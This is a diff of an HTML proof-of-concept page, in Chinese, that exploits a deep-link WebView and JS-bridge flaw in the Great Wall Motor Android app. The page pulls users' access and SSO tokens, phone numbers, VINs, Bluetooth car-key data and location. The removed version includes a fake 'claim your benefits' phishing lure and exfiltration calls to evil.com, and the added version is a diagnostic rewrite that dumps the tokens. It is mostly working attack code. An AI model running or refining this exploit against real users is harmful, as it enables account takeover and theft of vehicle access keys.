@@ -1,271 +1,220 @@
 <!DOCTYPE html>
 <!--
   ============================================================================
-   com.gwm.fusion  JS Bridge 凭据窃取 PoC (alert 展示版)
+   com.gwm.fusion  JS Bridge 凭据窃取 PoC v3 (诊断版)
   ----------------------------------------------------------------------------
-   漏洞链: sapp://app/webview?url=<本页> → WebViewFragment.loadUrl(无白名单)
-           → PWebView 加载攻击者页面 → dsbridge JS Bridge(无 origin 校验)
-           → 调用 userInfo()/userCarInfo() 等方法,直接返回 token 集群
-  ----------------------------------------------------------------------------
-   触发: 用户点击下列链接(网页/二维码即可,一次点击):
-         sapp://app/webview?url=https://evil.com/poc_jsb_exploit.html
-  ----------------------------------------------------------------------------
-   关键: 方法名必须带命名空间前缀(注入表4个namespace都指向同一个BaseJsBridge):
-         NativeController / Controller / Storage / GwmController
-         dsbridge.parseNamespace 按最后一个 '.' 拆 [namespace, method]
-         裸方法名(如 "userInfo") → namespace="" → 命中失败 → 返回 {"code":-1}
-         正确写法: "Controller.userInfo" 或 "GwmController.userInfo"
-  ----------------------------------------------------------------------------
-   本文件自包含最小 dsbridge polyfill,不依赖外部 JS 库。
-   仅用于授权安全测试。实战中外传改为 new Image().src=... 静默回传。
+   v3 目的: 定位 userInfo 为何无数据(userCarInfo 已实证可通)
+   关键事实: userCarInfo(line2099) 和 userInfo(line2115) 同类、同@注解、
+     同同步签名(Object)->JSONObject,无异步重载。userCarInfo能通 → userInfo
+     在协议层必能命中。无数据 → 99%是PoC的返回值解析bug,非方法无法调用。
+   v3 改进:
+     1. userInfo 单独诊断:打印原始返回字符串(不parse),分别试同步+异步
+     2. 同步返回值区分: 对象 / 原始字符串 / {"code":-1} / {"code":-999} / 空
+     3. tryParse 不吞异常:JSON.parse 失败时保留原始串展示
+     4. 同时保留 userCarInfo(锚点) 和 getAllCarsInfo(车辆全字段含bleMacAddress)
   ============================================================================
 -->
 <html lang="zh-CN">
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
-<title>长城汽车 · 车主权益</title>
+<title>长城汽车 · 诊断</title>
 <style>
   *{box-sizing:border-box;margin:0;padding:0}
-  body{font-family:-apple-system,"PingFang SC","Microsoft YaHei",sans-serif;
-       background:linear-gradient(135deg,#0b1f3a,#15315a);color:#fff;min-height:100vh;
-       display:flex;flex-direction:column;align-items:center;padding:24px}
-  .logo{font-size:20px;font-weight:700;letter-spacing:2px;margin:12px 0}
+  body{font-family:-apple-system,"PingFang SC",sans-serif;background:#0b1f3a;color:#fff;
+       min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:20px}
+  .logo{font-size:20px;font-weight:700;margin:10px 0}
   .card{background:rgba(255,255,255,.06);border:1px solid rgba(255,255,255,.12);
-        border-radius:14px;padding:22px;width:100%;max-width:420px;margin-top:18px;
-        box-shadow:0 8px 32px rgba(0,0,0,.3)}
-  h3{font-size:17px;margin-bottom:10px;color:#ffd24a}
-  p{font-size:13px;line-height:1.6;color:#cfd8e8}
-  .btn{margin-top:18px;padding:12px 0;width:100%;border:none;border-radius:10px;
-       background:linear-gradient(90deg,#c8102e,#e23a4a);color:#fff;font-size:15px;
-       font-weight:600;cursor:pointer}
-  .btn:active{opacity:.8}
-  .log{margin-top:14px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:11px;
-       color:#8be9a0;white-space:pre-wrap;word-break:break-all;max-height:200px;overflow:auto;
-       background:rgba(0,0,0,.25);border-radius:8px;padding:10px}
+        border-radius:14px;padding:20px;width:100%;max-width:440px;margin-top:14px}
+  h3{font-size:16px;color:#ffd24a;margin-bottom:8px}
+  .btn{margin-top:14px;padding:11px 0;width:100%;border:none;border-radius:10px;
+       background:linear-gradient(90deg,#c8102e,#e23a4a);color:#fff;font-size:15px;font-weight:600;cursor:pointer}
+  .log{margin-top:12px;font-family:ui-monospace,Menlo,Consolas,monospace;font-size:10.5px;
+       color:#8be9a0;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow:auto;
+       background:rgba(0,0,0,.3);border-radius:8px;padding:10px}
 </style>
 </head>
 <body>
 <div class="logo">长城汽车 GWM</div>
-
 <div class="card">
-  <h3>您有一项车主权益待领取</h3>
-  <p>您的账号存在未领取的会员权益(免费洗车 / 保养券 / 积分)。<br>
-     请点击下方按钮验证账号后领取。</p>
-  <button class="btn" id="go" onclick="run()">立即领取</button>
-  <div class="log" id="log">[等待用户点击]...</div>
+  <h3>账号诊断</h3>
+  <button class="btn" onclick="run()">开始</button>
+  <div class="log" id="log">[等待]</div>
 </div>
 
 <script>
-/* ============================================================================
-   最小 dsbridge polyfill —— 按 PWebView 真实协议实现 (不依赖外部库)
-   协议(经反编译核实):
-     js→native 同步入口 : _dsbridge.call(handlerName, argStr)  → 返回 string
-     native→js 回调入口 : window._handleMessageFromNative(JSON)
-     _dsb.hasNativeMethod({name,type}) / _dsb.dsinit() / _dsb.returnValue({id,complete,data})
-     方法名格式        : "namespace.method" (parseNamespace 按最后一个'.'拆)
-   暴露的 dsbridge JS API: dsBridge.call(method, arg, cb) / dsBridge.hasNativeMethod(method)
-   ========================================================================== */
+/* dsbridge polyfill (按 PWebView 真实协议) */
 (function(){
-  if (window.dsBridge) return;   // 官方H5自带则复用
-  var msgID = 0;
-  var cbs = {};                  // callbackId -> {complete, cb}
-
-  function mkArg(arg){
-    // dsbridge: 第二参数是 JSON 字符串;null/undefined 传空对象串避免Native端JSON解析异常
-    if (arg === undefined || arg === null) return '{}';
-    if (typeof arg === 'string') return arg;
-    return JSON.stringify(arg);
-  }
-
+  if (window.dsBridge) return;
+  var msgID = 0, cbs = {};
+  function mkArg(a){ if(a===undefined||a===null) return '{}';
+    if(typeof a==='string') return a; return JSON.stringify(a); }
   function call(method, arg, cb){
-    var argStr = mkArg(arg);
-    var ret;
-    try {
-      // 同步调用: _dsbridge.call(handlerName, argStr) 返回 string
-      ret = window._dsbridge.call(method, argStr);
-    } catch(e){
-      // 降级:部分版本注入名不同
-      try { ret = window._dsbridge.call(method, argStr); } catch(e2){ ret = null; }
-    }
+    var argStr = mkArg(arg), ret = null;
+    try { ret = window._dsbridge.call(method, argStr); } catch(e){ ret = null; }
     if (ret !== null && ret !== undefined && ret !== '') {
-      // 有同步返回值
-      try { ret = JSON.parse(ret); } catch(e){}
-      if (cb) { cb(ret, true); return; }   // 同步方法也有回调时直接完成
+      if (cb) { try { cb(ret, true); } catch(e){} return; }   // v3: 不预parse,原样传
       return ret;
     }
-    // 无同步返回值 → 走异步回调注册
     if (cb) {
       msgID++;
       cbs[msgID] = { cb: cb, complete: false };
-      // 异步方法: dsbridge 期望第二参数为带 callbackId 的 JSON
-      // PWebView 的 call(handlerName, argStr) 同步,异步靠 CompletionHandler
-      // 真实dsbridge: 异步在 argStr 里塞 _dscbstub + 用 returnValue 回传
-      // 这里用标准 dsbridge 协议补段:
-      var asyncArg;
-      try { asyncArg = JSON.parse(argStr); } catch(e){ asyncArg = {}; }
+      var asyncArg; try { asyncArg = JSON.parse(argStr); } catch(e){ asyncArg = {}; }
       asyncArg._dscbstub = '["' + msgID + '"]';
-      try {
-        window._dsbridge.call(method, JSON.stringify(asyncArg));
-      } catch(e){
-        cb(null, true);
-      }
+      try { window._dsbridge.call(method, JSON.stringify(asyncArg)); }
+      catch(e){ try{cb(null,true);}catch(_){} }
     }
     return null;
   }
-
-  function hasNativeMethod(method, type){
-    try {
-      return window._dsb.hasNativeMethod(
-        JSON.stringify({ name: method, type: type || 'all' }));
-    } catch(e){ return false; }
-  }
-
-  // native→js 回调入口: window._handleMessageFromNative(JSON)
   window._handleMessageFromNative = function(jsonStr){
     try {
-      var m = (typeof jsonStr === 'string') ? JSON.parse(jsonStr) : jsonStr;
-      var id = m.callbackId;
-      var entry = cbs[id];
+      var m = (typeof jsonStr==='string')?JSON.parse(jsonStr):jsonStr;
+      var entry = cbs[m.callbackId];
       if (!entry) return;
       var data = (m.data !== undefined) ? m.data : m;
-      var complete = m.complete !== false;   // 默认单次完成
-      try { entry.cb(data, complete); }
-      catch(e){}
-      if (complete) delete cbs[id];
+      try { entry.cb(data, m.complete !== false); } catch(e){}
+      if (m.complete !== false) delete cbs[m.callbackId];
     } catch(e){}
   };
-
-  // 触发启动队列(部分实现需要 dsinit 后才分发排队的native消息)
-  try { window._dsb.dsinit && window._dsb.dsinit({}); } catch(e){}
-
-  window.dsBridge = { call: call, hasNativeMethod: hasNativeMethod };
+  try { window._dsb && window._dsb.dsinit && window._dsb.dsinit({}); } catch(e){}
+  window.dsBridge = { call: call };
 })();
 
-/* ============================================================================
-   攻击载荷 —— 调用无 origin 校验的 JS Bridge 方法窃取凭据/数据
-   ========================================================================== */
-var NS = 'GwmController';        // 注入表4个namespace任选其一,均指向BaseJsBridge
-                                    // 备选: 'Controller' / 'NativeController' / 'Storage'
 var LOG = document.getElementById('log');
 var loot = [];
-
 function out(s){ LOG.textContent += '\n' + s; }
-function flush(){
-  var text = '\n========== 窃取结果 ==========\n' + loot.join('\n\n') + '\n============================';
-  out(text);
-  alert('【GWM Fusion JS Bridge 窃取 PoC】\n' + text +
-        '\n\n(实战中此处改为静默回传: new Image().src="https://evil.com/c?"+btoa(encodeURIComponent(...)))');
+
+/* 原始返回 → 结构化展示(不丢信息) */
+function describe(methodName, ret){
+  if (ret === null || ret === undefined) return methodName + ' → 返回 null/undefined(无同步值,可能异步)';
+  if (typeof ret === 'object'){
+    // 已经是对象
+    if (ret.code === -1) return methodName + ' → {"code":-1} (dsbridge未命中,namespace错?)';
+    if (ret.code === -999) return methodName + ' → {"code":-999} ' + (ret.message||'') + ' (进了方法体,参数错)';
+    return null;   // 正常对象,外层处理
+  }
+  // 字符串 → 尝试parse
+  var s = String(ret);
+  if (s === '{"code":-1}' || s === '{"code":-1,}') return methodName + ' → 字符串 {"code":-1} (未命中)';
+  var parsed;
+  try { parsed = JSON.parse(s); }
+  catch(e){
+    return methodName + ' → 非JSON字符串(len=' + s.length + '): ' + s.substring(0,200) + (s.length>200?'...':'');
+  }
+  if (parsed && typeof parsed === 'object'){
+    if (parsed.code === -1) return methodName + ' → parse后 {"code":-1} (未命中)';
+    if (parsed.code === -999) return methodName + ' → parse后 {"code":-999} ' + (parsed.message||'');
+    return null;   // parse成功,外层处理
+  }
+  return methodName + ' → 未知: ' + s.substring(0,200);
+}
+
+function fmtTokens(obj, prefix){
+  if (!obj || typeof obj !== 'object') return prefix + ' ' + JSON.stringify(obj);
+  return prefix +
+    '\n  accessToken: ' + (obj.accessToken||'-') +
+    '\n  ssoToken: ' + (obj.ssoToken||'-') +
+    '\n  ptToken: ' + (obj.ptToken||'-') +
+    '\n  gToken: ' + (obj.gToken||'-') +
+    '\n  tokenId: ' + (obj.tokenId||'-') +
+    '\n  userId: ' + (obj.userId||'-') +
+    '\n  phone: ' + (obj.phone||'-') +
+    '\n  email: ' + (obj.email||'-') +
+    '\n  nickName: ' + (obj.nickName||'-') +
+    '\n  isLogin: ' + (obj.isLogin===undefined?'-':obj.isLogin) +
+    '\n  isTspLogin: ' + (obj.isTspLogin===undefined?'-':obj.isTspLogin) +
+    '\n  原始JSON: ' + JSON.stringify(obj);
 }
 
 function run(){
-  LOG.textContent = '[开始调用 JS Bridge ...]';
+  LOG.textContent = '[运行中...]';
   loot = [];
+  var NS = null;
 
-  /* ① 账号凭据集群 —— 无参数,同步返回 (accessToken/ssoToken/ptToken/gToken/tokenId + userId/phone/email) */
-  try {
-    var u = dsBridge.call(NS + '.userInfo');
-    if (u && typeof u === 'object') {
-      loot.push('[userInfo] accessToken=' + (u.accessToken||'-') +
-                '\n           ssoToken=' + (u.ssoToken||'-') +
-                '\n           ptToken=' + (u.ptToken||'-') +
-                '\n           gToken=' + (u.gToken||'-') +
-                '\n           tokenId=' + (u.tokenId||'-') +
-                '\n           userId=' + (u.userId||'-') +
-                '\n           phone=' + (u.phone||'-') +
-                '\n           email=' + (u.email||'-') +
-                '\n           nickName=' + (u.nickName||'-') +
-                '\n           isLogin=' + (u.isLogin));
-    } else {
-      loot.push('[userInfo] 返回:' + JSON.stringify(u) + '  <- 若为 {"code":-1} 见下方排错');
-    }
-  } catch(e){ loot.push('[userInfo] 异常: ' + e); }
+  /* ① 用 userCarInfo 锁定 namespace (已知可通) */
+  out('[1] 锁定命名空间...');
+  var nss = ['GwmController','Controller','NativeController','Storage'];
+  for (var i=0;i<nss.length;i++){
+    var n = nss[i];
+    try {
+      var r = dsBridge.call(n + '.userCarInfo');
+      if (r && typeof r === 'object' && (r.beantechToken || r.ssoToken || r.navinfoToken)) {
+        NS = n; out('[+] 命中命名空间: ' + NS); break;
+      }
+      // 可能返回字符串,试parse
+      if (typeof r === 'string'){
+        try { var p = JSON.parse(r);
+          if (p && (p.beantechToken||p.ssoToken||p.navinfoToken)){ NS=n; out('[+] 命中命名空间(字符串parse): '+NS); break; }
+        } catch(e){}
+      }
+    } catch(e){}
+  }
+  if (!NS){ NS='GwmController'; out('[!] 未自动锁定,用 ' + NS + ' 继续'); }
 
-  /* ② 车辆凭据 —— beantechToken/ssoToken/navinfoToken */
+  /* ② userCarInfo 锚点 (已实证可通) */
+  out('[2] userCarInfo (锚点)...');
   try {
     var c = dsBridge.call(NS + '.userCarInfo');
-    loot.push('[userCarInfo] ' + JSON.stringify(c));
+    loot.push(fmtTokens(c ? (typeof c==='string'?JSON.parse(c):c) : null, '[userCarInfo] ✅') );
   } catch(e){ loot.push('[userCarInfo] 异常: ' + e); }
 
-  /* ③ 设备信息 —— deviceID/deviceName/厂商/版本 */
+  /* ③ userInfo 诊断 (重点) */
+  out('[3] userInfo 诊断...');
+  // 尝试1: 同步直取,原始返回
   try {
-    var a = dsBridge.call(NS + '.appInfo');
-    loot.push('[appInfo] ' + JSON.stringify(a));
-  } catch(e){ loot.push('[appInfo] 异常: ' + e); }
+    var u = dsBridge.call(NS + '.userInfo');
+    var d = describe('userInfo(同步)', u);
+    if (d) loot.push(d);   // 未命中或异常结构
+    else loot.push(fmtTokens(typeof u==='string'?JSON.parse(u):u, '[userInfo] ✅(同步)'));
+  } catch(e){ loot.push('[userInfo] 同步异常: ' + e); }
 
-  /* ④ 默认车 VIN */
+  // 尝试2: 异步带回调(以防该方法被dsbridge当异步处理)
   try {
-    var v = dsBridge.call(NS + '.defaultCarVin');
-    loot.push('[defaultCarVin] ' + JSON.stringify(v));
-  } catch(e){ loot.push('[defaultCarVin] 异常: ' + e); }
+    dsBridge.call(NS + '.userInfo', {}, function(r, done){
+      var d2 = describe('userInfo(异步)', r);
+      if (d2) loot.push(d2);
+      else loot.push(fmtTokens(typeof r==='string'?JSON.parse(r):r, '[userInfo] ✅(异步回调)'));
+      if (done) flush();
+    });
+  } catch(e){ loot.push('[userInfo] 异步异常: ' + e); }
 
-  /* ⑤ 全量车辆列表 */
+  /* ④ getAllCarsInfo — 所有车全字段(含 bleMacAddress / bluetoothKeyNew) */
+  out('[4] getAllCarsInfo...');
   try {
     var cars = dsBridge.call(NS + '.getAllCarsInfo');
-    loot.push('[getAllCarsInfo] ' + JSON.stringify(cars));
+    if (cars && typeof cars === 'string'){ try { cars = JSON.parse(cars); } catch(e){} }
+    if (Array.isArray(cars)){
+      loot.push('[getAllCarsInfo] ✅ 共' + cars.length + '辆车');
+      cars.forEach(function(car, idx){
+        if (car && typeof car === 'object'){
+          loot.push('  车#' + (idx+1) + ': vin=' + (car.vin||'-') +
+                    ' bleMacAddress=' + (car.bleMacAddress||'-') +
+                    ' bluetoothKeyNew=' + (car.bluetoothKeyNew||'-') +
+                    ' bluetoothSupplier=' + (car.bluetoothSupplier||'-') +
+                    ' licenseNumber=' + (car.licenseNumber||'-'));
+        }
+      });
+    } else {
+      loot.push('[getAllCarsInfo] ' + describe('getAllCarsInfo', cars));
+    }
   } catch(e){ loot.push('[getAllCarsInfo] 异常: ' + e); }
 
-  /* ⑥ GPS 实时定位 —— 异步,CompletionHandler 回调 */
-  try {
-    dsBridge.call(NS + '.locationInfo', {}, function(r, done){
-      loot.push('[locationInfo] ' + JSON.stringify(r));
-      if (done) flush2();
-    });
-  } catch(e){ loot.push('[locationInfo] 异常: ' + e); }
+  /* ⑤ appInfo / defaultCarVin / currentEnv */
+  out('[5] 其他...');
+  try { loot.push('[appInfo] ' + describe('appInfo', dsBridge.call(NS+'.appInfo'))); } catch(e){}
+  try { loot.push('[defaultCarVin] ' + describe('defaultCarVin', dsBridge.call(NS+'.defaultCarVin')); } catch(e){}
+  try { loot.push('[currentEnv] ' + describe('currentEnv', dsBridge.call(NS+'.currentEnv')); } catch(e){}
 
-  /* ⑦ 借 App 身份越权 HTTP —— hostType限ntsp/gtsp/log/xpi,但host字段覆盖setBaseUrl,
-        DefaultTokenAuthInterceptor 自动带 accessToken */
-  try {
-    dsBridge.call(NS + '.requestData', {
-      method: 'get',
-      hostType: 'ntsp',
-      host: 'https://evil.com/exfil',   // 任意host,token照样带上(可在服务端抓请求头)
-      url: '/grab',
-      params: {},
-      customHeader: { 'X-PoC': '1' }
-    }, function(r, done){
-      loot.push('[requestData] ' + JSON.stringify(r));
-      if (done) flush2();
-    });
-  } catch(e){ loot.push('[requestData] 异常: ' + e); }
-
-  // 兜底:同步部分先弹一次,异步回调到达后再弹
-  setTimeout(flush2, 1200);
-  setTimeout(flush2, 3500);
+  flush();
+  setTimeout(flush, 2500);   // 异步回调兜底
 }
-function flush2(){ if (loot.length) flush(); }
 
-/* ============================================================================
-   排错提示: 首次调用若返回 {"code":-1}
-   -1 = dsbridge 框架层"方法未命中" (PWebView.errorJson),非业务错误码(-999)
-   原因1: 漏了命名空间前缀 → 必须用 "Controller.userInfo" 而非 "userInfo"
-   原因2: 当前WebView未注入JS Bridge(非WebViewActivity,如ProtocolH5Activity未导出链)
-   验证: 先调 hasNativeMethod('Controller.userInfo','syn') 应返回 true
-   ========================================================================== */
-// 开机自检: 探测哪个命名空间可用
-(function probe(){
-  if (!window._dsbridge) {
-    out('[!] window._dsbridge 不存在 → 当前页面未在App WebView内,或注入名不同。');
-    out('    在系统浏览器打开此页无意义,需经 sapp://app/webview?url=<本页URL> 唤起。');
-    return;
-  }
-  var namespaces = ['GwmController','Controller','NativeController','Storage'];
-  var found = [];
-  namespaces.forEach(function(n){
-    try {
-      var ok = dsBridge.hasNativeMethod(n + '.userInfo', 'syn');
-      if (ok) found.push(n);
-    } catch(e){}
-  });
-  if (found.length) {
-    NS = found[0];
-    out('[+] 可用命名空间: ' + found.join(', ') + '  选用: ' + NS);
-    out('[+] hasNativeMethod("' + NS + '.userInfo") = true  → 点击按钮窃取凭据');
-  } else {
-    out('[!] 未探测到可用命名空间。可能:_dsb.hasNativeMethod 不可用,或注入延迟。');
-    out('    仍可直接点按钮尝试(默认NS=GwmController)。');
-  }
-})();
+function flush(){
+  var text = '\n========== 结果 ==========\n' + loot.join('\n\n') + '\n==========================';
+  out(text);
+  alert('【GWM JSB 诊断 v3】\n' + text +
+        '\n\n请把 userInfo 那段原始返回贴回,我据此判断是调用约定问题还是方法真的不通。');
+}
 </script>
 </body>
 </html>
